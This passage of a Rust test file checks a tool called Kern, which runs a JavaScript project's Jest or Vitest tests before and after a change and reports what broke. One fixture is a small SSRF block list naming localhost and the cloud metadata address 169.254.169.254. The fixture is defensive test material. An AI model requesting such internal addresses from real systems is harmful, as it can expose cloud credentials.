    let after = report(&[("t/a.test.ts > hook guarded", 0, 0, 1), ("t/b.test.ts > really skipped", 0, 0, 1), ("t/c.test.ts > skips alone on old", 0, 0, 1)], &[]);
    let again = report(&[("t/a.test.ts > hook guarded", 1, 0, 0), ("t/b.test.ts > really skipped", 0, 0, 1), ("t/c.test.ts > skips alone on old", 0, 0, 1)], &[]);
    let alone_old = report(&[("t/a.test.ts > hook guarded", 1, 0, 0), ("t/b.test.ts > really skipped", 1, 0, 0), ("t/c.test.ts > skips alone on old", 0, 0, 1)], &[]);
    let c = suite::judged(&before, &after, Some(&again), Some(&alone_old));
    assert_eq!(c["newly_skipped"], json!(["t/b.test.ts > really skipped"]), "a hook that fails at random makes vitest skip a suite's tests: {c}");
}

#[test]
fn a_receipt_never_says_tests_still_pass_when_no_test_could_load_on_the_old_code() {
    let mut before = report(&[], &["app/a.test.ts", "app/b.test.ts"]);
    before.why.insert("app/a.test.ts".into(), "Cannot use import statement outside a module".into());
    let mut after = before.clone();
    after.problems.push("app/new.test.ts".into());
    let c = suite::compare(&before, &after, Some(&after));
    assert_eq!(c["status"], "NOT_RUN", "nothing loaded on the old code, so there was nothing to compare: {c}");
    assert!(c["why"].as_str().unwrap().contains("could load"), "{c}");
    assert_eq!(c["new_failing"], json!(["app/new.test.ts"]), "a test file the change adds that does not run is still listed: {c}");
    let md = receipt::markdown(&receipt::build(&drive_json(), &clean_rules(), &c, &off()), None);
    assert!(!md.contains("still pass"), "{md}");
}

#[test]
fn a_suite_too_big_for_the_time_limit_runs_only_the_tests_related_to_the_change() {
    let files: std::collections::BTreeSet<String> = ["packages/web/src/cart.ts".to_string(), "packages/web/src/total.ts".to_string()].into();
    let tests = |runner: policy::Runner, command: &[&str]| policy::Tests { paths: Vec::new(), kind: policy::Kind::Feature, runner, command: command.iter().map(|s| s.to_string()).collect(), edits: policy::Edits::Checked };
    let jest = suite::related(&tests(policy::Runner::Jest, &["/workspace/node_modules/.bin/jest", "--config", "jest.unit.js"]), &files, "packages/web").unwrap();
    assert_eq!(jest.command, ["/workspace/node_modules/.bin/jest", "--config", "jest.unit.js", "--findRelatedTests", "/workspace/packages/web/src/cart.ts", "/workspace/packages/web/src/total.ts"]);
    let vitest = suite::related(&tests(policy::Runner::Vitest, &["/workspace/node_modules/.bin/vitest", "run", "--project", "unit"]), &files, "packages/web").unwrap();
    assert_eq!(vitest.command, ["/workspace/node_modules/.bin/vitest", "related", "src/cart.ts", "src/total.ts", "--run", "--project", "unit"]);
    assert!(suite::related(&tests(policy::Runner::Vitest, &["/workspace/node_modules/.bin/vitest", "run", "tests/unit"]), &files, "packages/web").is_none(), "a script that already filters files is not narrowed");
    assert!(suite::related(&tests(policy::Runner::Mocha, &["/workspace/node_modules/.bin/mocha"]), &files, "").is_none());
    assert!(suite::related(&tests(policy::Runner::Jest, &["/workspace/node_modules/.bin/jest"]), &std::collections::BTreeSet::new(), "").is_none(), "no changed code, nothing related");
    let focus = suite::focused(&tests(policy::Runner::Vitest, &["/workspace/node_modules/.bin/vitest", "run", "--project", "unit"]), &files, "packages/web");
    assert!(focus.is_some(), "an option's value is not a file filter");
}

#[test]
fn farm_cases_a_replaced_test_is_gone_and_tests_of_a_file_that_did_not_load_before_are_not_new() {
    let file = "packages/backend/src/verify.test.ts";
    let before = report(&[(&format!("{file} > verifies a token"), 1, 0, 0), (&format!("{file} > verifies provided OAuth token"), 1, 0, 0)], &[]);
    let after = report(&[(&format!("{file} > verifies a token"), 1, 0, 0), (&format!("{file} > verifies opaque OAuth token with aud=undefined"), 1, 0, 0)], &[file]);
    let again = report(&[(&format!("{file} > verifies a token"), 1, 0, 0), (&format!("{file} > verifies opaque OAuth token with aud=undefined"), 1, 0, 0)], &[]);
    let c = suite::compare(&before, &after, Some(&again));
    assert_eq!(c["broke"], json!([]), "clerk#9585 replaced the test with an it.each; its file also reported an error, but its tests loaded: {c}");
    assert_eq!(c["gone"], json!([format!("{file} > verifies provided OAuth token")]), "{c}");
    let before = report(&[("core/a.test.js > works", 1, 0, 0)], &["core/members.test.js"]);
    let after = report(&[("core/a.test.js > works", 1, 0, 0), ("core/members.test.js > lists", 0, 1, 0), ("core/members.test.js > adds", 0, 1, 0)], &[]);
    let c = suite::compare(&before, &after, Some(&after));
    assert_eq!((c["new_failing"].clone(), c["added"].clone()), (json!([]), json!([])), "Ghost#28552: a file that could not load on the old run has no baseline, so its tests are not new: {c}");
}

#[test]
fn a_report_whose_test_titles_cut_an_emoji_in_half_is_still_read() {
    let title = format!("{}\\ud83d ...", "\u{1f600}".repeat(3));
    let jest = format!(r#"{{"numTotalTests":2,"testResults":[{{"name":"/workspace/test/a.test.js","status":"passed","message":"","assertionResults":[{{"ancestorTitles":["emoji"],"title":"{title}","status":"passed"}},{{"ancestorTitles":["emoji"],"title":"keeps \ud83d\ude00 pairs and \\ud83d text","status":"passed"}}]}}]}}"#);
    let r = kern::proof::read_report(policy::Runner::Jest, jest.as_bytes()).unwrap_or_else(|e| panic!("a test title that a runner cut inside an emoji makes the whole report unreadable: {e}"));
    let keys: Vec<&String> = r.tests.keys().collect();
    assert_eq!(keys.len(), 2, "{keys:?}");
    assert!(keys.iter().any(|k| k.ends_with("\u{1f600}\u{1f600}\u{1f600}\u{fffd} ...")) && keys.iter().any(|k| k.ends_with("keeps \u{1f600} pairs and \\ud83d text")), "{keys:?}");
}

#[test]
fn a_change_to_tests_and_docs_alone_puts_nothing_back_and_raises_no_test_data_look() {
    let t = Temp::new();
    let test = "import { total } from '../src/total.js';\nimport { items } from './helpers.js';\nimport { test, expect } from 'vitest';\ntest('adds', () => expect(total(items())).toBe(3));\n";
    let (r, base) = repo(&t, &[("package.json", r#"{"name":"shop","type":"module","scripts":{"test":"vitest run"},"devDependencies":{"vitest":"3.2.0"}}"#),
        ("src/total.js", "export const total = (xs) => xs.reduce((a, b) => a + b, 0);\n"), ("test/helpers.js", "export const items = () => [1, 2];\n"), ("test/total.test.js", test), ("README.md", "# shop\n")]);
    let head = commit(&r, &[("test/helpers.js", "export const items = () => [1, 2];\nexport const none = () => [];\n"), ("test/total.test.js", &format!("{test}test('adds none', () => expect(total([])).toBe(0));\n")),
        ("README.md", "# shop\n\nAdds things.\n")]);
    let old = report(&[("test/total.test.js > adds", 1, 0, 0)], &[]);
    let keep = suite::kept_plan(&r, (&base, &head), &kern::rules::changed(&r, &base, &head).unwrap(), &old, "");
    assert!(keep.run.is_empty() && keep.data.is_empty() && keep.skipped.is_empty(),
        "the change adds a test, a helper and a line to the README; no code changes, so the old tests on the new code are the old tests on the old code, which passed: nothing to put back and nothing to look at: run {:?} data {:?}", keep.run, keep.data);
}

#[test]
fn the_old_copy_of_a_test_follows_moved_modules_and_reads_its_old_data() {
    let t = Temp::new();
    let test = "import { total } from '../src/total';\nimport { sum } from '../src/sum.js';\nimport { lib } from '../src/lib';\nimport { readFileSync } from 'node:fs';\nimport { test, expect } from 'vitest';\nconst cases = JSON.parse(readFileSync(new URL('./fixtures/cases.json', import.meta.url), 'utf8'));\nconst note = './not a path';\nconst gone = '../src/nowhere.js';\ntest('adds', () => expect(total([2, 3]) + sum([]) + lib + cases.length).toBe(6));\n";
    let (r, base) = repo(&t, &[("package.json", r#"{"name":"shop","type":"module","scripts":{"test":"vitest run"},"devDependencies":{"vitest":"3.2.0"}}"#),
        ("src/total.ts", "export const total = (xs: number[]) => xs.reduce((a, b) => a + b, 0);\n"), ("src/sum.ts", "export const sum = (xs: number[]) => xs.length;\n"),
        ("src/lib/index.ts", "export const lib = 1;\n"), ("test/fixtures/cases.json", "[1]\n"), ("test/total.test.ts", test)]);
    git(&r, &["mv", "src/total.ts", "src/add.ts"]);
    git(&r, &["mv", "src/sum.ts", "src/count.ts"]);
    git(&r, &["mv", "src/lib", "src/core"]);
    let head = commit(&r, &[("test/total.test.ts", &test.replace("../src/total'", "../src/add'").replace("../src/sum.js", "../src/count.js").replace("../src/lib'", "../src/core'")),
        ("test/fixtures/cases.json", "[1, 2]\n"), ("src/add.ts", "export const total = (xs: number[]) => xs.reduce((a, b) => a + b, 1);\n")]);
    let old = report(&[("test/total.test.ts > adds", 1, 0, 0)], &[]);
    let keep = suite::kept_plan(&r, (&base, &head), &kern::rules::changed(&r, &base, &head).unwrap(), &old, "");
    let copy = "test/total.kern-kept.test.ts";
    let new_text = keep.files.get(copy).unwrap_or_else(|| panic!("the edited test is put back: {:?}", keep.files.keys()));
    for (what, want) in [("an import without its extension follows the rename", "'../src/add'"), ("a .js import of a TypeScript file keeps its .js", "'../src/count.js'"),
        ("a folder import follows the folder", "'../src/core'"), ("the test reads its old data", "'./fixtures/cases.kern-kept.json'"),
        ("a string that is no path stays", "'./not a path'"), ("a path to nothing stays", "'../src/nowhere.js'")] {
        assert!(new_text.contains(want), "{what}: {want} in\n{new_text}");
    }
    assert_eq!(keep.files.get("test/fixtures/cases.kern-kept.json").map(String::as_str), Some("[1]\n"), "the old data is put back beside the new");
    let old_text = &keep.old_files[copy];
    assert!(old_text.contains("'../src/total'") && old_text.contains("'../src/sum.js'") && old_text.contains("'./fixtures/cases.kern-kept.json'"), "on the old code the copy keeps the old paths:\n{old_text}");
    assert!(keep.data.is_empty(), "the data file is checked through the old test, so it needs no look: {:?}", keep.data);
}

#[test]
fn a_test_renamed_in_an_edited_file_whose_old_version_still_passes_is_not_gone() {
    let t = Temp::new();
    let test = |title: &str| format!("import {{ blocked }} from '../src/ssrf.js';\nimport {{ it, expect }} from 'vitest';\nit.each(['localhost', '169.254.169.254'])('{title}', (h) => expect(blocked(h)).toBe(true));\n");
    let (r, base) = repo(&t, &[("package.json", r#"{"name":"shop","type":"module","scripts":{"test":"vitest run"},"devDependencies":{"vitest":"3.2.0"}}"#),
        ("src/ssrf.js", "export const blocked = (h) => ['localhost', '169.254.169.254'].includes(h);\n"), ("test/ssrf.test.js", &test("blocks cloud metadata endpoint %s"))]);
    let head = commit(&r, &[("src/ssrf.js", "export const blocked = (h) => ['localhost', '127.0.0.1', '169.254.169.254'].includes(h);\n"), ("test/ssrf.test.js", &test("blocks %s"))]);
    let old_keys = ["test/ssrf.test.js > blocks cloud metadata endpoint localhost", "test/ssrf.test.js > blocks cloud metadata endpoint 169.254.169.254"];
    let old = report(&old_keys.iter().map(|k| (*k, 1, 0, 0)).collect::<Vec<_>>(), &[]);
    let keep = suite::kept_plan(&r, (&base, &head), &kern::rules::changed(&r, &base, &head).unwrap(), &old, "");
    let copy = keep.run.iter().next().expect("the edited test file is put back").clone();
    let mut ran = Report::default();
    for k in old_keys { ran.tests.insert(k.replace("test/ssrf.test.js", &copy), Count { passed: 1, failed: 0, skipped: 0 }); }
    let outcome = suite::kept_outcome(&old, &keep, Ok(suite::unkept(&ran, &keep.back)), None);
    assert_eq!(outcome.held.iter().collect::<std::collections::BTreeSet<_>>(), old_keys.iter().map(|k| k.to_string()).collect::<Vec<_>>().iter().collect(),
        "the change renames the tests' title template; their old versions still pass on the new code, so what they checked still holds and they are not gone");
    assert!(outcome.rewritten.is_empty() && outcome.unchecked.is_empty());
}

#[test]
fn changed_data_that_only_tests_kern_does_not_run_use_needs_no_look() {
    let t = Temp::new();
    let (r, base) = repo(&t, &[("package.json", r#"{"name":"shop","type":"module","scripts":{"test":"vitest run"},"devDependencies":{"vitest":"3.2.0"}}"#),
        ("src/total.js", "export const total = (xs) => xs.reduce((a, b) => a + b, 0);\n"), ("test/total.test.js", "import { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\ntest('adds', () => expect(total([1, 2])).toBe(3));\n"),
        ("e2e/fixtures/worker.js", "export default { fetch: () => new Response('ok') };\n"), ("test/fixtures/load.js", "export const load = (name) => import(`./${name}.js`);\n")]);
    let head = commit(&r, &[("src/total.js", "export const total = (xs) => xs.reduce((a, b) => a + b, 1);\n"), ("e2e/fixtures/worker.js", "export default { fetch: () => new Response('ko') };\n"),
        ("test/fixtures/load.js", "export const load = (name) => import(`./${name}.mjs`);\n")]);
    let old = report(&[("test/total.test.js > adds", 1, 0, 0)], &[]);
    let keep = suite::kept_plan(&r, (&base, &head), &kern::rules::changed(&r, &base, &head).unwrap(), &old, "");
    assert_eq!(keep.data, ["test/fixtures/load.js"],
        "e2e/ holds only end-to-end tests Kern does not run, so a changed file there cannot hide a break in the tests it runs; test/fixtures/ sits beside the tests that ran, and no old test names it, so it needs a look");
}

#[test]
fn a_new_test_that_fails_the_way_old_tests_already_fail_here_is_set_aside() {
    let knex = "Error: Knex: run\n$ npm install sqlite3 --save\nCannot find module 'bindings'\nRequire stack:\n- /workspace/node_modules/.pnpm/sqlite3@5.1.7/lib/binding.js";
    let report = |rows: &[(&str, &str, Option<&str>)]| -> Value {
        let results: Vec<Value> = rows.iter().map(|(file, title, error)| json!({ "name": format!("/workspace/{file}"), "status": if error.is_some() { "failed" } else { "passed" },
            "assertionResults": [{ "ancestorTitles": [], "title": title, "status": if error.is_some() { "failed" } else { "passed" }, "failureMessages": error.map(|e| vec![e.to_string()]).unwrap_or_default() }] })).collect();
        json!({ "numTotalTests": rows.len(), "testResults": results })
    };
    let read = |v: Value| kern::proof::read_report(policy::Runner::Vitest, v.to_string().as_bytes()).unwrap();
    let before = read(report(&[("test/old-db.test.js", "reads a post", Some(knex)), ("test/math.test.js", "adds", None)]));
    let after = read(report(&[("test/old-db.test.js", "reads a post", Some(knex)), ("test/math.test.js", "adds", None),
        ("test/price.test.js", "formats a price", Some(&knex.replace("5.1.7", "5.1.8"))), ("test/total.test.js", "totals", Some("AssertionError: expected 6 to be 5"))]));
    let c = suite::compare(&before, &after, Some(&after));
    assert_eq!(c["same_failure"], json!(["test/price.test.js > formats a price"]), "a new test that fails the way old tests already fail here (sqlite's native part is missing) is the sandbox, not the change: {c}");
    assert_eq!(c["new_failing"], json!(["test/total.test.js > totals"]), "a new test that fails some other way still needs a look: {c}");
    let md = receipt::markdown(&receipt::build(&drive_json(), &json!({ "changed": [] }), &c, &off()), None);
    assert!(md.contains("1 new fail here the same way tests already failing on the old code do"), "{md}");
}

#[test]
fn many_items_in_one_test_file_are_one_line() {
    let names: Vec<String> = (1..=5).map(|i| format!("test/price.test.js > formats case {i}")).collect();
    let mut tests = suite::compare(&report(&[("test/a.test.js > adds", 1, 0, 0)], &[]), &report(&[("test/a.test.js > adds", 1, 0, 0)], &[]), None);
    tests["new_failing"] = json!(names.iter().chain(["test/other.test.js > one".to_string()].iter()).collect::<Vec<_>>());
    let r = receipt::build(&drive_json(), &json!({ "changed": [] }), &tests, &off());
    let what: Vec<&str> = r["look"].as_array().unwrap().iter().filter(|x| x["kind"] == "new-test-fails").map(|x| x["what"].as_str().unwrap()).collect();
    assert_eq!(what.len(), 2, "five failing tests in one file are one item, the one in another file its own: {what:#?}");
    assert!(what[0].starts_with("5 tests this change adds fail on the new code in `test/price.test.js`") && what[0].ends_with(", …"), "{what:#?}");
}

#[test]
fn the_package_a_test_cannot_load_is_read_from_the_runners_own_error() {
    let errors = [
        "src/config/lightdashConfig.mock.ts:1:55 - error TS2307: Cannot find module '@lightdash/common' or its corresponding type declarations.",
        "Cannot find module 'gatsby-worker' from '.jestSetup.js'",
        "Failed to load url @midscene/shared/env (resolved id: @midscene/shared/env) in /workspace/packages/android/tests/unit-test/agent.test.ts. Does the file exist?",
        "Error: Failed to resolve entry for package \"@mono/lib\". The package may have incorrect main/module/exports specified in its package.json.",
        "Cannot find module './version' from 'components/version/index.tsx'",
        "Cannot find module 'node:fs/promises'",
        "Error: Cannot find module '/workspace/node_modules/@acme/core/dist/index.js'",
    ];
    let found = suite::missing_packages(&errors.join("\n"));
    assert_eq!(found.into_iter().collect::<Vec<_>>(), ["@acme/core", "@lightdash/common", "@midscene/shared", "@mono/lib", "gatsby-worker"], "relative files and node's own modules are not packages");
}

#[test]
fn the_packages_a_test_needs_are_built_after_the_ones_they_need() {
    let pkg = |name: &str, deps: &[&str], build: bool| -> Value {
        let mut v = json!({ "name": name, "dependencies": deps.iter().map(|d| (d.to_string(), json!("workspace:*"))).collect::<serde_json::Map<String, Value>>() });
        if build { v["scripts"] = json!({ "build": "tsc -b" }); }
        v
    };
    let mut ws = suite::Workspace::new();
    ws.insert("@acme/app".into(), ("packages/app".into(), pkg("@acme/app", &["@acme/ui", "react"], true)));
    ws.insert("@acme/ui".into(), ("packages/ui".into(), pkg("@acme/ui", &["@acme/core"], true)));
    ws.insert("@acme/core".into(), ("packages/core".into(), pkg("@acme/core", &[], true)));
    ws.insert("@acme/types".into(), ("packages/types".into(), pkg("@acme/types", &[], false)));
    let steps = suite::repair_steps(&ws, &["@acme/ui".to_string(), "@acme/types".to_string()].into_iter().collect(), Some(""), ("", &[]));
    assert_eq!(steps, [("packages/core".to_string(), "build".to_string()), ("packages/ui".to_string(), "build".to_string()), (String::new(), "pretest".to_string())],
        "ui needs core built first; app is not needed; types has nothing to build; the root's pretest runs last, as npm test would run it");
}

#[test]
fn the_build_steps_reach_the_sandbox_under_a_name_it_accepts() {
    let src = std::fs::read_to_string(concat!(env!("CARGO_MANIFEST_DIR"), "/src/suite.rs")).unwrap();
    let name = src.split("process.env.").nth(1).and_then(|s| s.split(')').next()).unwrap_or("");
    assert!(kern::script::env_name(name), "the test run refuses variable {name:?}, so the build step would never run (KERN_ names are Kern's own)");
}

#[test]
fn a_runner_that_crashes_is_quoted_by_its_first_error_not_only_its_last_lines() {
    let err = b"failed to load config from /workspace/apps/web/vite.config.ts

Startup Error
Error: Failed to load native binding
    at Object.<anonymous> (/workspace/node_modules/@swc/core/binding.js:345:11)
  [cause]: [
  ]
}
";
    let why = suite::no_results("the output contains no vitest report", b"exit 1", err, b"");
    assert!(why.contains("its first error: failed to load config from /workspace/apps/web/vite.config.ts") && why.contains("the last lines it printed"), "{why}");
}

#[test]
fn a_platform_part_npm_left_out_is_found_and_only_the_one_for_this_machine() {
    let t = Temp::new();
    let nm = t.0.join("node_modules");
    let arch = if cfg!(target_arch = "aarch64") { "arm64" } else { "x64" };
    std::fs::create_dir_all(nm.join("@rollup/rollup")).unwrap();
    std::fs::write(nm.join("@rollup/rollup/package.json"), json!({ "name": "@rollup/rollup", "optionalDependencies": {
        format!("@rollup/rollup-linux-{arch}-gnu"): "4.20.0", format!("@rollup/rollup-linux-{arch}-musl"): "4.20.0", "@rollup/rollup-darwin-arm64": "4.20.0", "@rollup/rollup-win32-x64-msvc": "4.20.0" } }).to_string()).unwrap();
    std::fs::create_dir_all(nm.join("esbuild")).unwrap();
    std::fs::write(nm.join("esbuild/package.json"), json!({ "name": "esbuild", "optionalDependencies": { format!("@esbuild/linux-{arch}"): "0.23.0" } }).to_string()).unwrap();
    std::fs::create_dir_all(nm.join(format!("@esbuild/linux-{arch}"))).unwrap();
    let parts = kern::sandbox::missing_platform_parts(&nm);
    assert_eq!(parts, [(format!("@rollup/rollup-linux-{arch}-gnu"), "4.20.0".to_string())],
        "npm's lockfile from a Mac leaves out rollup's Linux part (npm/cli#4828), so vitest cannot start; esbuild's is already there, and musl, macOS and Windows parts are not this machine's");
}

#[test]
fn a_locked_file_keeps_its_owners_write_bit_so_a_tests_own_copy_of_it_can_be_edited() {
    use kern::sandbox::locked_mode;
    assert_eq!(locked_mode(0o644, false), 0o644, "sentry-wizard and react-router copy fixtures to /tmp and edit the copies; a 0444 original made 0444 copies the test could not write");
    assert_eq!(locked_mode(0o666, false), 0o644, "nobody but the owner, root, may write a project file");
    assert_eq!(locked_mode(0o600, false), 0o644);
    assert_eq!(locked_mode(0o4775, false), 0o755);
    assert_eq!(locked_mode(0o700, true), 0o1777);
}

#[test]
fn installs_retry_with_the_lockfile_then_with_npms_older_peer_rules_and_do_not_stop_at_a_node_version() {
    let t = Temp::new();
    write(&t.0, "package.json", "{}");
    write(&t.0, "package-lock.json", "{}");
    let (manager, attempts) = kern::sandbox::install_plan(&t.0);
    let args: Vec<String> = attempts.iter().map(|(a, _)| a[2..].join(" ")).collect();
    assert_eq!(manager, "npm");
    assert_eq!(args.len(), 3, "{args:?}");
    assert!(args[0].starts_with("ci --ignore-scripts"), "{args:?}");
    assert!(args[1].starts_with("install --ignore-scripts") && !args[1].contains("--no-package-lock"), "after npm ci fails, the lockfile is still used: {args:?}");
    assert!(args[2].contains("--no-package-lock") && args[2].contains("--legacy-peer-deps"), "lobehub and vercel/nft stop at npm's peer dependency conflicts: {args:?}");
    assert!(args.iter().all(|a| a.contains("--engine-strict=false")), "biofile-finder's .npmrc refuses Node 22 for a project that asks for 20.x: {args:?}");
    assert!(attempts.iter().all(|(_, said)| said.starts_with("installed")));
    std::fs::remove_file(t.0.join("package-lock.json")).unwrap();
    let (_, attempts) = kern::sandbox::install_plan(&t.0);
    assert_eq!(attempts.len(), 2);
    assert!(attempts[1].0.iter().any(|a| a == "--legacy-peer-deps"));
    write(&t.0, "yarn.lock", "");
    let (manager, attempts) = kern::sandbox::install_plan(&t.0);
    assert_eq!(manager, "yarn");
    assert!(attempts.iter().all(|(a, _)| a.iter().any(|x| x == "--ignore-engines")), "otlplus and terraware ask yarn for Node 18 and 24 and yarn 1 refuses 22");
}

#[test]
fn an_old_vitest_that_does_not_know_no_cache_is_run_again_without_it() {
    let command: Vec<String> = ["/workspace/node_modules/.bin/vitest", "run", "--reporter=json", "--no-cache"].iter().map(|s| s.to_string()).collect();
    assert_eq!(kern::sandbox::retried_command(&command, "CACError: Unknown option `--cache`").as_deref(), Some(&command[..3]), "AntAlmanac's vitest 0.34.6");
    assert_eq!(kern::sandbox::retried_command(&command, "Error: Cannot find module 'x'"), None);
    assert_eq!(kern::sandbox::retried_command(&command[..3], "CACError: Unknown option `--cache`"), None);
}

#[test]
fn a_failed_install_is_named_as_the_reason_the_tests_did_not_run() {
    let setup = json!({ "old": { "installs": [
        { "dir": ".", "manager": "npm", "result": "failed: npm error code EBADENGINE\nnpm error engine Unsupported engine\nnpm error notsup Required: {\"node\":\"20.x\"}" },
        { "dir": "packages/web", "manager": "npm", "result": "installed" },
        { "dir": "packages/ui", "manager": null, "result": "installed with the workspace" } ] } });
    assert_eq!(suite::install_failure(&setup, "old", "").as_deref(), Some("installing its dependencies with npm failed: npm error code EBADENGINE"),
        "12 of 139 receipts said the runner was not installed when the install had failed");
    assert_eq!(suite::install_failure(&setup, "old", "packages/web"), None);
    assert_eq!(suite::install_failure(&setup, "old", "packages/ui/src"), None);
    assert!(suite::install_failure(&setup, "old", "packages/api").is_some(), "a package without its own install uses the root's");
    let yarn = json!({ "new": { "installs": [{ "dir": ".", "manager": "yarn", "result": "failed: \u{27a4} YN0000: \u{2514} Completed\n\u{27a4} YN0041: \u{2502} scratch-gui@npm:13.7.3: Invalid authentication (as an anonymous user)\n\u{27a4} YN0000: \u{b7} Failed with errors in 2s" }] } });
    assert!(suite::install_failure(&yarn, "new", "").unwrap().contains("Invalid authentication"));
}

#[test]
fn a_runner_that_stops_before_any_test_is_told_apart_from_one_that_finds_none() {
    assert!(suite::stopped_early(b"exit 1", b"Error: FRONT_DATABASE_URI must be set to a test DB", b"{}"), "dust's global setup threw, and the receipt said the runner found no tests");
    assert!(suite::stopped_early(b"exit 0", b"Error: nuxt-module-build failed: Error: spawnSync pnpm ENOENT", b"{}"));
    assert!(!suite::stopped_early(b"exit 1", b"", b"{\"numTotalTests\":0,\"testResults\":[]}"), "jest exits 1 when no test is related to ant-design's docs theme; no error, no crash");
    assert!(!suite::stopped_early(b"exit 1", b"No tests found, exiting with code 1", b"{}"), "a package with no tests left is the old finding, not a crash");
    assert!(!suite::stopped_early(b"exit 1", b"", b"No test files found, exiting with code 1"));
    assert!(!suite::stopped_early(b"exit 0", b"", b"{}"), "MetaMask's github-tools has no jest tests and passes with none");
}

#[test]
fn a_suite_on_course_to_take_far_longer_than_its_limit_is_stopped_early_and_one_that_will_finish_is_not() {
    use kern::sandbox::early_stop;
    let start = 1_000_000u64;
    let lines = |total: u64, done: &[(u64, String)]| -> String {
        std::iter::once(format!("total {total}")).chain(done.iter().map(|(ms, p)| format!("done {} {p}", start + ms))).collect::<Vec<_>>().join("\n")
    };
    let metamask: Vec<(u64, String)> = (0..40).map(|i| (60_000 + i * 3_000, format!("/workspace/ui/t{i}.test.ts"))).collect();
    assert_eq!(early_stop(start, start + 180_000, 900, &lines(2000, &metamask)).as_deref(), Some("projected 6060 180"),
        "metamask-extension ran 15 minutes, then its related tests 15 more, and gave nothing");
    let ghost: Vec<(u64, String)> = (0..15).map(|i| (60_000 + i * 3_500, format!("/workspace/ghost/core/t{i}.test.js"))).collect();
    assert_eq!(early_stop(start, start + 112_000, 900, &lines(700, &ghost)), None, "Ghost's suite starts slowly and finished in 453 seconds; an early guess must not stop it");
    let speeding: Vec<(u64, String)> = (0..10).map(|i| (60_000 + i * 10_000, format!("/w/slow{i}.test.js"))).chain((0..100).map(|i| (150_000 + i * 600, format!("/w/fast{i}.test.js")))).collect();
    assert_eq!(early_stop(start, start + 210_000, 900, &lines(3000, &speeding)), None, "the recent pace wins when the run is speeding up");
    let quick_after_slow_start: Vec<(u64, String)> = (0..120).map(|i| (300_000 + i * 100, format!("/workspace/t{i}.test.ts"))).collect();
    assert_eq!(early_stop(start, start + 312_000, 900, &lines(3000, &quick_after_slow_start)), None, "five minutes of start-up, then ten files a second: done in about ten minutes");
    assert_eq!(early_stop(start, start + 450_000, 900, &lines(500, &[])).as_deref(), Some("stalled 450"), "loreai printed only warnings for 30 minutes");
    assert_eq!(early_stop(start, start + 449_000, 900, &lines(500, &[])), None);
    let few: Vec<(u64, String)> = [100_000, 110_000, 120_000].iter().enumerate().map(|(i, ms)| (*ms, format!("/w/{i}.test.js"))).collect();
    assert_eq!(early_stop(start, start + 600_000, 900, &lines(5, &few)), None, "a handful of files is left to the time limit");
    let steady: Vec<(u64, String)> = (1..=10).map(|i| (i * 10_000, format!("/w/{i}.test.js"))).collect();
    assert_eq!(early_stop(start, start + 100_000, 900, &lines(100, &steady)), None, "on course for about 17 minutes: within twice the limit, so it runs on");
    let twice: Vec<(u64, String)> = (0..40).map(|i| (60_000 + (i % 3) * 3_000, "/w/same.test.js".to_string())).collect();
    assert_eq!(early_stop(start, start + 180_000, 900, &lines(2000, &twice)), None, "a file reported twice counts once");
}

#[test]
fn a_runner_that_cannot_load_kerns_progress_reporter_is_run_again_without_it() {
    let s = |l: &[&str]| -> Vec<String> { l.iter().map(|x| x.to_string()).collect() };
    let vitest = s(&["/workspace/node_modules/.bin/vitest", "run", "--reporter=json", "--outputFile=/tmp/.kern-report.json", "--reporter=/kern/vitest-progress.mjs"]);
    assert_eq!(kern::sandbox::retried_command(&vitest, "Error: Failed to load custom Reporter from /kern/vitest-progress.mjs"), Some(vitest[..4].to_vec()));
    let jest = s(&["/workspace/node_modules/.bin/jest", "--ci", "--testResultsProcessor=/kern/jest-report.cjs", "--reporters=default", "--reporters=/kern/jest-progress.cjs"]);
    assert_eq!(kern::sandbox::retried_command(&jest, "Could not resolve a module for a custom reporter: /kern/jest-progress.cjs"), Some(jest[..3].to_vec()));
}

#[test]
fn a_run_stopped_early_says_how_long_it_was_on_course_to_take() {
    assert_eq!(suite::stopped_why("projected 6210 180", 900).as_deref(),
        Some("the tests were on course to take about 103 minutes (the limit is 15 minutes), so Kern stopped the run after 3 minutes"));
    assert_eq!(suite::stopped_why("stalled 450", 900).as_deref(), Some("no test file finished in 7 minutes (the limit is 15 minutes), so Kern stopped the run"));
    assert_eq!(suite::stopped_why("exit 1", 900), None);
    assert_eq!(suite::whole("the tests were on course to take about 103 minutes"), "the whole suite was on course to take about 103 minutes");
    assert_eq!(suite::whole("the tests did not finish in 15 minutes"), "the whole suite did not finish in 15 minutes");
}

#[test]
fn vitests_banners_and_stack_lines_are_not_quoted_as_the_error() {
    let err = "\u{23af}\u{23af}\u{23af}\u{23af} Unhandled Error \u{23af}\u{23af}\u{23af}\u{23af}\nError: SHOP_DATABASE_URL must be set to a test database\n \u{276f} default test/setup.js:1:62\n \u{276f} start node_modules/vitest/dist/chunks/cac.Cb-PYCCB.js:1412:15\n \u{276f} CAC.run node_modules/vitest/dist/chunks/cac.Cb-PYCCB.js:1391:2\n\u{23af}\u{23af}\u{23af}\u{23af}\u{23af}\u{23af}\n";
    let why = suite::no_results("the runner stopped before running any test", b"exit 1", err.as_bytes(), b"{}");
    assert!(why.contains("SHOP_DATABASE_URL must be set to a test database"), "the e2e crash case quoted vitest's banner instead: {why}");
    assert!(!why.contains("Unhandled Error \u{23af}") && !why.contains("CAC.run"), "{why}");
}

#[test]
fn a_vitest_that_does_not_know_one_of_kerns_options_runs_again_without_only_that_one() {
    let s = |l: &[&str]| -> Vec<String> { l.iter().map(|x| x.to_string()).collect() };
    let command = s(&["/workspace/node_modules/.bin/vitest", "run", "--reporter=json", "--no-cache", "--bail=0", "--sequence.shuffle=false"]);
    assert_eq!(kern::sandbox::retried_command(&command, "CACError: Unknown option `--sequence`"), Some(command[..5].to_vec()));
    assert_eq!(kern::sandbox::retried_command(&command, "CACError: Unknown option `--sequence.shuffle`"), Some(command[..5].to_vec()));
    assert_eq!(kern::sandbox::retried_command(&command, "CACError: Unknown option `--bail`"), Some(s(&["/workspace/node_modules/.bin/vitest", "run", "--reporter=json", "--no-cache", "--sequence.shuffle=false"])));
    assert_eq!(kern::sandbox::retried_command(&command, "CACError: Unknown option `--color`"), None, "only Kern's own options are dropped");
}

#[test]
fn a_build_step_the_test_script_names_is_run_before_tests_that_find_no_files() {
    let ws: suite::Workspace = std::collections::BTreeMap::new();
    let missing = std::collections::BTreeSet::new();
    assert_eq!(suite::repair_steps(&ws, &missing, None, ("packages/mcp", &["build".to_string()])), [("packages/mcp".to_string(), "build".to_string())]);
